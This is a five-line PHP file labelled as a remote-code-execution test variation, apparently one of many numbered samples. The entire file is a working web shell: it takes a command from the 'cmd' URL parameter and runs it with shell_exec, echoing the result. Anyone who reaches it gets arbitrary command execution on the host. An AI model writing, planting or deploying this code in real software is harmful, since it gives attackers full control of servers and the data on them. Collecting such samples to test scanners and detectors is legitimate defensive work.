<?php
// RCE test variation #450
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>